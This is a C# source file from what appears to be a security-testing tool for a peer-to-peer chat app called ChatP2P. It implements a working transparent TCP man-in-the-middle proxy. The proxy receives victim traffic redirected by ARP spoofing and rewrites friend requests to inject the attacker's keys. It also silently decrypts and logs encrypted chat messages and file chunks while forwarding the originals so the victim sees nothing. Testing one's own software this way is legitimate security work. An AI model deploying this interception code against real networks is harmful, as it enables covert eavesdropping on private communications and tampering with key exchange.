using System;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;
using ChatP2P.SecurityTester.Models;
using ChatP2P.SecurityTester.Crypto;
using ChatP2P.SecurityTester.Core;

namespace ChatP2P.SecurityTester.Network
{
    /// <summary>
    /// 🕷️ Proxy TCP transparent pour MITM réel - Interception et modification packets ChatP2P
    /// </summary>
    public class TCPProxy : IDisposable
    {
        private TcpListener? _proxyListener;
        private bool _isRunning = false;
        private readonly KeySubstitutionAttack _keyAttack;
        private CancellationTokenSource? _cancellationToken;
        private readonly List<TcpClient> _activeConnections = new();
        private readonly object _connectionsLock = new();
        private bool _disposed = false;

        public event Action<string>? LogMessage;
        public event Action<AttackResult>? PacketModified;

        public TCPProxy(KeySubstitutionAttack keyAttack)
        {
            _keyAttack = keyAttack;
        }

        /// <summary>
        /// 🚀 Démarre proxy TCP transparent avec mapping automatique des ports ChatP2P
        /// </summary>
        public async Task<bool> StartProxy(int listenPort, string targetHost, int targetPort, IPAddress? listenAddress = null)
        {
            try
            {
                // 🎯 Utiliser IP fournie ou détecter automatiquement
                IPAddress bindAddress;
                if (listenAddress != null)
                {
                    bindAddress = listenAddress;
                    LogMessage?.Invoke($"🎯 FORCED IP BINDING: {bindAddress}:{listenPort}");
                }
                else
                {
                    // 🚨 ARCHITECTURE VM FIXÉE: Écouter sur IP attaquant (portproxy ne marche pas)
                    var attackerIP = GetLocalIPAddress();
                    bindAddress = IPAddress.Parse(attackerIP);  // IP attaquant directe
                    LogMessage?.Invoke($"🔧 AUTO-DETECTED IP: {bindAddress}:{listenPort}");
                }

                // 🚨 ARCHITECTURE VM DIRECTE: Plus de portproxy, écoute directe
                LogMessage?.Invoke($"🔧 ARCHITECTURE VM DIRECTE: TCPProxy {bindAddress}:{listenPort}");
                LogMessage?.Invoke($"📡 FLOW: Victime → ARP-Spoof → TCPProxy({bindAddress}:{listenPort}) → {targetHost}:{targetPort}");

                _proxyListener = new TcpListener(bindAddress, listenPort);
                _proxyListener.Start();
                _isRunning = true;
                _cancellationToken = new CancellationTokenSource();

                LogMessage?.Invoke($"🕷️ Proxy TCP MITM: {bindAddress}:{listenPort} → {targetHost}:{targetPort}");
                LogMessage?.Invoke($"🎯 Architecture: Victime → ARP-Spoof → TCPProxy({bindAddress}:{listenPort}) → Relay({targetHost}:{targetPort})");
                LogMessage?.Invoke($"📡 En attente connexions directes via ARP spoofing...");
                LogMessage?.Invoke($"🔧 DEBUG: TcpListener créé sur {bindAddress}:{listenPort}");
                LogMessage?.Invoke($"🔧 DEBUG: _isRunning={_isRunning}, Task.Run lancé pour AcceptConnections");

                // Test si le port est bien ouvert
                LogMessage?.Invoke($"🔧 DEBUG: Test port ouverture - TcpListener.LocalEndpoint = {_proxyListener.LocalEndpoint}");
                LogMessage?.Invoke($"🔧 DEBUG: Test port ouverture - TcpListener.Server.IsBound = {_proxyListener.Server.IsBound}");

                // Accepter connexions entrantes de manière asynchrone
                _ = Task.Run(async () => await AcceptConnections(targetHost, targetPort, _cancellationToken.Token));

                // Petite attente pour vérifier que le listener fonctionne
                await Task.Delay(100);
                LogMessage?.Invoke($"🔧 DEBUG: Proxy TCP opérationnel - En attente connexions...");

                // ✅ SUPPRIMÉ: Tests connexions automatiques (causaient connexions parasites au relay)

                return true;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur démarrage proxy: {ex.Message}");
                LogMessage?.Invoke($"🔧 DEBUG: Stack trace: {ex.StackTrace}");
                return false;
            }
        }

        private async Task AcceptConnections(string targetHost, int targetPort, CancellationToken cancellationToken)
        {
            try
            {
                LogMessage?.Invoke($"🔧 DEBUG: AcceptConnections démarré - _isRunning={_isRunning}");
                LogMessage?.Invoke($"🔧 DEBUG: En attente sur _proxyListener.AcceptTcpClientAsync()...");

                while (_isRunning && !cancellationToken.IsCancellationRequested)
                {
                    LogMessage?.Invoke($"🔧 DEBUG: Boucle accept iteration - en attente connexion...");
                    LogMessage?.Invoke($"🔧 DEBUG: _proxyListener state: {_proxyListener?.Server?.IsBound}");

                    try
                    {
                        LogMessage?.Invoke($"🔧 DEBUG: Calling AcceptTcpClientAsync()...");
                        var clientSocket = await _proxyListener!.AcceptTcpClientAsync();
                        LogMessage?.Invoke($"📡 CONNEXION REÇUE: {clientSocket.Client.RemoteEndPoint}");
                        LogMessage?.Invoke($"🔧 DEBUG: Client connecté, lancement HandleConnection");

                        // Traiter chaque connexion en parallèle avec tracking
                        lock (_connectionsLock)
                        {
                            _activeConnections.Add(clientSocket);
                        }
                        _ = Task.Run(async () => {
                            try
                            {
                                await HandleConnection(clientSocket, targetHost, targetPort, cancellationToken);
                            }
                            finally
                            {
                                lock (_connectionsLock)
                                {
                                    _activeConnections.Remove(clientSocket);
                                }
                            }
                        });
                    }
                    catch (Exception ex)
                    {
                        LogMessage?.Invoke($"❌ ERREUR CRITIQUE AcceptTcpClientAsync: {ex.Message}");
                        LogMessage?.Invoke($"🔧 DEBUG: Exception type: {ex.GetType().Name}");
                        LogMessage?.Invoke($"🔧 DEBUG: Stack trace: {ex.StackTrace}");
                        LogMessage?.Invoke($"🔧 DEBUG: Proxy binding failed, stopping accept loop");
                        break;
                    }
                }

                LogMessage?.Invoke($"🔧 DEBUG: Sortie boucle AcceptConnections - _isRunning={_isRunning}, cancelled={cancellationToken.IsCancellationRequested}");
            }
            catch (Exception ex) when (!cancellationToken.IsCancellationRequested)
            {
                LogMessage?.Invoke($"❌ Erreur acceptation connexions: {ex.Message}");
                LogMessage?.Invoke($"🔧 DEBUG: Exception stack: {ex.StackTrace}");
            }
        }

        private async Task HandleConnection(TcpClient clientSocket, string targetHost, int targetPort, CancellationToken cancellationToken)
        {
            TcpClient? relaySocket = null;

            try
            {
                LogMessage?.Invoke($"🔧 DEBUG: HandleConnection démarré pour {clientSocket.Client.RemoteEndPoint}");

                // PROXY INTELLIGENT - Connexion par défaut au port API (8889)
                // Le port sera ajusté dynamiquement selon le contenu
                int dynamicTargetPort = targetPort; // Commence avec 8889 par défaut

                LogMessage?.Invoke($"🔧 DEBUG: Tentative connexion vers {targetHost}:{dynamicTargetPort}");

                relaySocket = new TcpClient();
                relaySocket.ReceiveTimeout = 600000; // 10 minutes - connexion persistante
                relaySocket.SendTimeout = 600000;    // 10 minutes
                relaySocket.ReceiveBufferSize = 1048576; // 1MB buffer
                relaySocket.SendBufferSize = 1048576;    // 1MB buffer
                relaySocket.NoDelay = true;             // Désactive Nagle Algorithm (performance)
                relaySocket.LingerState = new System.Net.Sockets.LingerOption(false, 0); // Pas de linger
                await relaySocket.ConnectAsync(targetHost, dynamicTargetPort);

                // ⏱️ FIX TIMEOUT: Keep-alive pour relay socket aussi
                relaySocket.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);

                LogMessage?.Invoke($"🔄 Tunnel établi: Client ↔ [PROXY] ↔ {targetHost}:{targetPort}");

                // ⚡ Configuration optimisée pour gros JSON (search peers)
                clientSocket.ReceiveBufferSize = 1048576; // 1MB
                clientSocket.SendBufferSize = 1048576;    // 1MB
                clientSocket.ReceiveTimeout = 600000;     // 10 minutes - connexion persistante
                clientSocket.SendTimeout = 600000;        // 10 minutes
                clientSocket.NoDelay = true;              // Performance optimale
                clientSocket.LingerState = new System.Net.Sockets.LingerOption(false, 0);

                // ⏱️ FIX TIMEOUT: Keep-alive pour maintenir connexions proxy en vie
                clientSocket.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);

                var clientStream = clientSocket.GetStream();
                var relayStream = relaySocket.GetStream();

                LogMessage?.Invoke($"🔧 DEBUG: Démarrage RelayData bidirectionnel");

                // Relais bidirectionnel avec interception
                var task1 = RelayData(clientStream, relayStream, "Client→Relay", cancellationToken);
                var task2 = RelayData(relayStream, clientStream, "Relay→Client", cancellationToken);

                await Task.WhenAny(task1, task2);
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur tunnel: {ex.Message}");
                LogMessage?.Invoke($"🔧 DEBUG: HandleConnection exception: {ex.StackTrace}");
            }
            finally
            {
                try
                {
                    clientSocket?.Close();
                    relaySocket?.Close();
                }
                catch (Exception ex)
                {
                    LogMessage?.Invoke($"⚠️ Error closing connections: {ex.Message}");
                }
                LogMessage?.Invoke("🔚 Tunnel fermé");
            }
        }

        private async Task RelayData(NetworkStream source, NetworkStream destination, string direction, CancellationToken cancellationToken)
        {
            try
            {
                var buffer = new byte[1048576]; // 1MB buffer pour gros JSON (search peers)
                bool isSearchConnection = false;

                using var combinedCts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
                combinedCts.CancelAfter(TimeSpan.FromMinutes(5)); // Max 5 minutes per connection

                while (!combinedCts.Token.IsCancellationRequested)
                {
                    int bytesRead;
                    try
                    {
                        bytesRead = await source.ReadAsync(buffer, 0, buffer.Length, combinedCts.Token);
                    }
                    catch (OperationCanceledException) when (combinedCts.Token.IsCancellationRequested)
                    {
                        LogMessage?.Invoke($"⏱️ Timeout {direction}: Max connection time reached");
                        break;
                    }

                    if (bytesRead == 0)
                    {
                        // ✅ Connexion fermée proprement côté serveur (normal pour search)
                        if (isSearchConnection)
                        {
                            LogMessage?.Invoke($"✅ SEARCH: Connexion fermée proprement par serveur - {direction}");
                        }
                        break;
                    }

                    var data = new byte[bytesRead];
                    Array.Copy(buffer, data, bytesRead);

                    // 🔍 DEBUGGING: Log premiers bytes pour diagnostiquer
                    if (bytesRead > 0)
                    {
                        var hexDump = BitConverter.ToString(data, 0, Math.Min(16, bytesRead));
                        LogMessage?.Invoke($"📊 {direction}: {bytesRead} bytes - Hex: {hexDump}");

                        try
                        {
                            var preview = Encoding.UTF8.GetString(data, 0, Math.Min(100, bytesRead));
                            LogMessage?.Invoke($"📝 {direction}: Text preview: {preview.Replace("\r", "\\r").Replace("\n", "\\n")}");
                        }
                        catch
                        {
                            LogMessage?.Invoke($"📊 {direction}: Binary data (non-UTF8)");
                        }
                    }

                    // 🔍 Détecter si c'est une connexion search AVANT modification
                    byte[] finalData = data;
                    try
                    {
                        var content = Encoding.UTF8.GetString(data);
                        if (content.Contains("search_peers") || content.Contains("\"peers\":") ||
                            (content.Contains("p2p") && content.Contains("start")) ||
                            content.Contains("\"Command\":\"p2p\"") ||
                            content.Contains("\"Action\":\"start\""))
                        {
                            isSearchConnection = true;
                            // 🚨 FIX CRITIQUE: Search/P2P start = relais direct (PAS de modification)
                            LogMessage?.Invoke($"🔍 CONNEXION P2P/SEARCH: {direction} - relais transparent");
                            finalData = data; // Pas de modification = relais direct
                        }
                        else
                        {
                            // 🚨 FIX CRITIQUE: Ne pas intercepter les requêtes API normales !
                            // SEULES les friend requests doivent être interceptées pour substituer les clés
                            if (content.Contains("FRIEND_REQ") || content.Contains("SECURE_FRIEND_REQUEST"))
                            {
                                LogMessage?.Invoke($"🎯 FRIEND REQUEST DETECTED: {direction} - interception active");
                                // 🕷️ INTERCEPTION FRIEND REQUESTS SEULEMENT
                                finalData = await InterceptAndModify(data, direction);
                            }
                            else
                            {
                                // 🔧 RELAIS TRANSPARENT pour tout le reste (API, contacts, etc.)
                                LogMessage?.Invoke($"🔧 API REQUEST: {direction} - relais transparent");
                                finalData = data; // Pas de modification
                            }
                        }
                    }
                    catch
                    {
                        // Si décodage UTF8 échoue, relayer tel quel
                        finalData = data;
                    }

                    try
                    {
                        await destination.WriteAsync(finalData, 0, finalData.Length, combinedCts.Token);
                        await destination.FlushAsync(combinedCts.Token);
                    }
                    catch (OperationCanceledException) when (combinedCts.Token.IsCancellationRequested)
                    {
                        LogMessage?.Invoke($"⏱️ Write timeout {direction}: Cancelling connection");
                        break;
                    }
                }
            }
            catch (Exception ex) when (!cancellationToken.IsCancellationRequested)
            {
                // 🔍 SEARCH: Ignorer timeouts normaux pour les connexions search
                if (ex.Message.Contains("timeout") || ex.Message.Contains("time") ||
                    ex.Message.Contains("A connection attempt failed") ||
                    ex.Message.Contains("established connection failed"))
                {
                    LogMessage?.Invoke($"⏱️ CONNEXION FERMÉE: {direction} - Normal pour search one-shot");
                    LogMessage?.Invoke($"   Type: {ex.GetType().Name}");
                    return; // Exit proprement sans erreur
                }

                LogMessage?.Invoke($"❌ Erreur relais {direction}: {ex.Message}");
                LogMessage?.Invoke($"🔧 DEBUG: Exception type: {ex.GetType().Name}");
            }
        }

        /// <summary>
        /// 🎯 Intercepte et modifie les packets ChatP2P en temps réel
        /// </summary>
        private async Task<byte[]> InterceptAndModify(byte[] data, string direction)
        {
            try
            {
                // 🔧 FIX SEARCH: Conversion UTF8 peut corrompre search JSON
                string content;
                try
                {
                    content = Encoding.UTF8.GetString(data);
                }
                catch
                {
                    // Si décodage UTF8 échoue, relayer tel quel
                    LogMessage?.Invoke($"⚠️ BINARY DATA - Relais transparent {direction}: {data.Length} bytes");
                    return data;
                }

                // 🔍 PRIORITY CHECK: Search peers = relais transparent (pas de modification)
                if (content.Contains("search_peers") || content.Contains("find_peer"))
                {
                    LogMessage?.Invoke($"🔍 SEARCH REQUEST: {direction} - {data.Length} bytes");
                    LogMessage?.Invoke($"🔍 SEARCH CONTENT: {content.Substring(0, Math.Min(200, content.Length))}");
                    return data; // ✅ RELAIS DIRECT SANS CONVERSION
                }

                // 🔍 SEARCH RESPONSE: Detection et gestion spéciale
                if (content.Contains("\"peers\":") && direction == "Relay→Client")
                {
                    LogMessage?.Invoke($"🔍 SEARCH RESPONSE: {direction} - {data.Length} bytes");
                    LogMessage?.Invoke($"✅ Peers trouvés dans réponse - connexion terminée proprement");

                    // Marquer que cette connexion est pour un search (one-shot)
                    _ = Task.Run(async () =>
                    {
                        await Task.Delay(1000); // Laisser le temps de transmettre
                        LogMessage?.Invoke($"🔚 Search terminé - fermeture connexion dans 1s");
                    });

                    return data; // ✅ RELAIS DIRECT SANS CONVERSION
                }

                // 🐛 DEBUG: Logger TOUT le trafic pour diagnostic (sauf search)
                if (content.Length > 10) // Ignore petits packets vides
                {
                    var preview = content.Length > 50 ? content.Substring(0, 50) + "..." : content;
                    LogMessage?.Invoke($"🔍 DEBUG {direction}: {preview}");
                }

                // 🔍 Détecter friend requests JSON API
                if ((content.Contains("\"Action\":\"receive_friend_request\"") ||
                     content.Contains("\"Action\":\"send_friend_request\"") ||
                     content.Contains("FRIEND_REQ:") || content.Contains("FRIEND_REQ_DUAL:") ||
                     content.Contains("SECURE_FRIEND_REQUEST")) && direction == "Client→Relay")
                {
                    LogMessage?.Invoke($"🎯 FRIEND REQUEST INTERCEPTÉE!");
                    LogMessage?.Invoke($"   Direction: {direction}");
                    LogMessage?.Invoke($"   Contenu: {content.Substring(0, Math.Min(100, content.Length))}...");

                    // 🕷️ SUBSTITUTION CLÉS EN TEMPS RÉEL
                    var attackResult = await _keyAttack.AttemptFriendRequestSubstitution(content);

                    if (attackResult.Success && !string.IsNullOrEmpty(attackResult.Details))
                    {
                        LogMessage?.Invoke("✅ SUBSTITUTION RÉUSSIE - Clés attaquant injectées!");

                        PacketModified?.Invoke(new AttackResult
                        {
                            Success = true,
                            AttackType = "REAL_TIME_KEY_SUBSTITUTION",
                            Description = "Friend request modifiée en temps réel",
                            Details = $"Original: {content.Length} bytes → Modifié: {attackResult.Details.Length} bytes"
                        });

                        return Encoding.UTF8.GetBytes(attackResult.Details);
                    }
                }

                // 🔓 Détecter messages chiffrés PQC pour déchiffrement
                if (content.Contains("[PQC_ENCRYPTED]") && direction == "Client→Relay")
                {
                    LogMessage?.Invoke($"🔒 MESSAGE CHIFFRÉ INTERCEPTÉ!");
                    LogMessage?.Invoke($"   Direction: {direction}");
                    LogMessage?.Invoke($"   Contenu chiffré: {content.Substring(0, Math.Min(100, content.Length))}...");

                    // 🕷️ DÉCHIFFREMENT EN TEMPS RÉEL avec clés attaquant
                    var decryptResult = await _keyAttack.AttemptMessageDecryption(content);

                    if (decryptResult.Success && !string.IsNullOrEmpty(decryptResult.Details))
                    {
                        LogMessage?.Invoke("🔓 DÉCHIFFREMENT RÉUSSI - Message en clair lu!");
                        LogMessage?.Invoke($"💬 Contenu: \"{decryptResult.Details}\"");

                        PacketModified?.Invoke(new AttackResult
                        {
                            Success = true,
                            AttackType = "REAL_TIME_MESSAGE_DECRYPTION",
                            Description = "Message chiffré déchiffré en temps réel",
                            Details = $"Message: \"{decryptResult.Details}\""
                        });

                        // Laisser passer le message chiffré original (invisible)
                    }
                }

                // 📁 Détecter fichiers chiffrés pour déchiffrement
                if (content.Contains("FILE_CHUNK_RELAY:") && content.Contains("ENC:") && direction == "Client→Relay")
                {
                    LogMessage?.Invoke($"📁 FICHIER CHIFFRÉ INTERCEPTÉ!");
                    LogMessage?.Invoke($"   Direction: {direction}");
                    LogMessage?.Invoke($"   Chunk chiffré: {content.Substring(0, Math.Min(100, content.Length))}...");

                    // 🕷️ DÉCHIFFREMENT FICHIER EN TEMPS RÉEL avec clés attaquant
                    var decryptResult = await _keyAttack.AttemptFileDecryption(content);

                    if (decryptResult.Success && !string.IsNullOrEmpty(decryptResult.Details))
                    {
                        LogMessage?.Invoke("🔓 FICHIER DÉCHIFFRÉ - Chunk en clair lu!");
                        LogMessage?.Invoke($"📄 Contenu: {decryptResult.Details.Substring(0, Math.Min(50, decryptResult.Details.Length))}...");

                        PacketModified?.Invoke(new AttackResult
                        {
                            Success = true,
                            AttackType = "REAL_TIME_FILE_DECRYPTION",
                            Description = "Fichier chiffré déchiffré en temps réel",
                            Details = $"Chunk: {decryptResult.Details.Length} bytes déchiffrés"
                        });

                        // Laisser passer le chunk chiffré original (invisible)
                    }
                }

                // 🔍 Logger autres trafics intéressants (JSON API + anciens formats)
                if (content.Contains("\"Action\":\"send_message\"") || content.Contains("\"Action\":\"handle_file_message\"") ||
                    content.Contains("CHAT_MSG") || content.Contains("FILE_CHUNK"))
                {
                    LogMessage?.Invoke($"📨 Trafic ChatP2P: {direction} - {content.Substring(0, Math.Min(50, content.Length))}...");
                }

                // 🔍 NOTE: Search peers diagnostic supprimé - relais transparent activé

                // 🕷️ INJECTION AUTOMATIQUE FRIEND REQUEST si on voit "PEERS:VM1,VM2"
                if (content.Contains("PEERS:VM1,VM2") && direction == "Relay→Client")
                {
                    LogMessage?.Invoke($"🎯 PEERS détectés ! Injection automatique friend request VM1→VM2");
                    LogMessage?.Invoke($"⚠️ Friend request injection not implemented yet");
                }

                return data; // Pas de modification
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur modification packet: {ex.Message}");
                return data; // Retourner données originales en cas d'erreur
            }
        }


        public bool IsRunning => _isRunning;

        private async Task TestLocalConnection(int port)
        {
            await Task.Delay(500); // Attendre que le proxy soit bien démarré

            try
            {
                LogMessage?.Invoke($"🧪 TEST: Tentative connexion locale vers localhost:{port}");

                using var testClient = new TcpClient();
                testClient.ReceiveTimeout = 5000;
                testClient.SendTimeout = 5000;

                await testClient.ConnectAsync("127.0.0.1", port);
                LogMessage?.Invoke($"✅ TEST: Connexion locale réussie vers localhost:{port}");

                // Envoyer données de test
                var testData = System.Text.Encoding.UTF8.GetBytes("TEST_CONNECTION\n");
                var stream = testClient.GetStream();
                await stream.WriteAsync(testData, 0, testData.Length);

                LogMessage?.Invoke($"📤 TEST: Données test envoyées");

                testClient.Close();
                LogMessage?.Invoke($"🔚 TEST: Connexion test fermée");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ TEST: Échec connexion locale: {ex.Message}");
                LogMessage?.Invoke($"🔧 TEST: Exception type: {ex.GetType().Name}");
            }
        }



        private IPAddress GetListenerAddress(IPAddress? listenAddress)
        {
            if (listenAddress != null)
            {
                return listenAddress;
            }

            if (IPAddress.TryParse(SecurityTesterConfig.AttackerIP, out var attackerIp) &&
                attackerIp.AddressFamily == AddressFamily.InterNetwork &&
                IsLocalIPAddress(attackerIp))
            {
                LogMessage?.Invoke($"[PORTPROXY] Binding TCP proxy on attacker IP {attackerIp}");
                return attackerIp;
            }

            LogMessage?.Invoke($"[PORTPROXY] Attacker IP '{SecurityTesterConfig.AttackerIP}' not assigned locally. Binding on 0.0.0.0");
            return IPAddress.Any;
        }

        private static bool IsLocalIPAddress(IPAddress address)
        {
            try
            {
                var assignedAddresses = NetworkInterface.GetAllNetworkInterfaces()
                    .Where(nic => nic.OperationalStatus == OperationalStatus.Up)
                    .SelectMany(nic => nic.GetIPProperties().UnicastAddresses)
                    .Select(uni => uni.Address);

                return assignedAddresses.Any(ip => ip.Equals(address));
            }
            catch
            {
                return false;
            }
        }

        private string GetLocalIPAddress()
        {
            try
            {
                // Obtenir l'IP locale réelle (pas localhost)
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                var localIP = host.AddressList
                    .Where(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    .Where(ip => !System.Net.IPAddress.IsLoopback(ip))
                    .FirstOrDefault();

                return localIP?.ToString() ?? "localhost";
            }
            catch
            {
                return "localhost";
            }
        }

        /// <summary>
        /// 🛑 Arrête le proxy TCP proprement
        /// </summary>
        public void StopProxy()
        {
            try
            {
                LogMessage?.Invoke("⏹️ Stopping TCP Proxy...");

                _isRunning = false;
                _cancellationToken?.Cancel();

                // Close all active connections
                lock (_connectionsLock)
                {
                    LogMessage?.Invoke($"🔄 Closing {_activeConnections.Count} active connections...");
                    foreach (var connection in _activeConnections.ToList())
                    {
                        try
                        {
                            connection?.Close();
                        }
                        catch (Exception ex)
                        {
                            LogMessage?.Invoke($"⚠️ Error closing connection: {ex.Message}");
                        }
                    }
                    _activeConnections.Clear();
                }

                // Stop listener
                if (_proxyListener != null)
                {
                    _proxyListener.Stop();
                    LogMessage?.Invoke("✅ TCP Proxy listener stopped");
                }

                LogMessage?.Invoke("⏹️ TCP Proxy stopped successfully");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Error stopping TCP Proxy: {ex.Message}");
            }
        }

        /// <summary>
        /// 🗑️ Dispose pattern implementation
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!_disposed && disposing)
            {
                StopProxy();
                _cancellationToken?.Dispose();
                _disposed = true;
            }
        }

        ~TCPProxy()
        {
            Dispose(false);
        }
    }
}
